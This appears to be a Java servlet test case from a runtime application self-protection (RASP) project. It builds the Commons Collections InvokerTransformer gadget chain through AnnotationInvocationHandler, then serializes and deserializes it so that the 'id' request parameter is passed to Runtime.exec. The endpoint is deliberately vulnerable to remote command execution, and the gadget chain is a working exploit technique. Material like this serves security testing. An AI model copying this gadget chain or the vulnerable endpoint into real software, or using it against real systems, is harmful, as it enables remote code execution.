package com.baidu.rasp;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.map.TransformedMap;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

/**
 * @description: 反序列化测试case
 * @author: anyang
 * @create: 2019/02/25 14:15
 */
public class Deserialization extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        doPost(req, resp);
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            String id = req.getParameter("id");
            if (id != null) {
                Transformer[] transformers = new Transformer[]{
                        new ConstantTransformer(Runtime.class),
                        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                                new Object[]{"getRuntime", new Class[0]}),
                        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                                new Object[]{null, new Object[0]}),
                        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{id})
                };
                Transformer transformerChain = new ChainedTransformer(transformers);
                Map innermap = new HashMap();
                innermap.put("value", "value");
                Map outmap = TransformedMap.transformingMap(innermap, null, transformerChain);
                Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
                Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
                ctor.setAccessible(true);
                Object instance = ctor.newInstance(Retention.class, outmap);
                File f = new File("obj");
                ObjectOutputStream outStream = new ObjectOutputStream(new FileOutputStream(f));
                outStream.writeObject(instance);
                outStream.flush();
                outStream.close();
                ObjectInputStream in = new ObjectInputStream(new FileInputStream("obj"));
                in.readObject();
                in.close();
            }
        } catch (Exception e) {
            resp.getWriter().println(e);
        }
    }
}
